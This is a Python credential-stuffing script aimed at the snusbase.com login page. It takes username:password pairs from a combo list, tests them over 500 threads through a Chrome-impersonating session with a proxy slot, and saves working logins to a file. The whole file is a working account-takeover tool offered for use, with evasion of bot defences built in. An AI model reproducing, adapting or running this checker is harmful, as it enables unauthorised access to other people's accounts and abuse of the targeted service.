import concurrent.futures
from curl_cffi import requests
import threading, concurrent.futures
from colorama import Fore
import curl_cffi
import curl_cffi.requests

class feds:
    def __init__(self):
        self.session = curl_cffi.requests.Session(
            impersonate="chrome",
        )
        self.session.headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.snusbase.com',
            'pragma': 'no-cache',
            'prefer': 'safe',
            'priority': 'u=0, i',
            'referer': 'https://www.snusbase.com/login',
            'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
        }
        self.prox = "" # proxy here
        self.proxy = {
            "http": self.prox,
            "https": self.prox
        }
        self.session.proxies = self.proxy
    def check(self, username, password):
        data = {
            'login': username,
            'password': password,
            'remember_me': 'on',
            'action_login': '',
        }
        r = self.session.post('https://www.snusbase.com/login', data=data)
        if "Sign out" in r.text:
            print(f'{Fore.GREEN}[+] Valid: {username}:{password} {Fore.RESET}')
            with open("valid_accounts.txt", "a") as file:
                file.write(f"{username}:{password}\n")
        elif "The username or password you entered was not found in our database." in r.text:
            print(f'{Fore.RED}[-] Invalid: {username}:{password} {Fore.RESET}')
        elif "Too many login attempts" in r.text:
            print(f'{Fore.RED}[-] Too many login attempts: {username}:{password} {Fore.RESET}')
        else:
            print(r.text)

if __name__ == "__main__":
    with open('combo.txt', encoding="utf-8") as file:
        accounts=file.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as thread:
        for account in accounts:
            try:
                if ":" in account:
                    user, passw=account.split(':')
            except:
                continue
            thread.submit(feds().check, user, passw)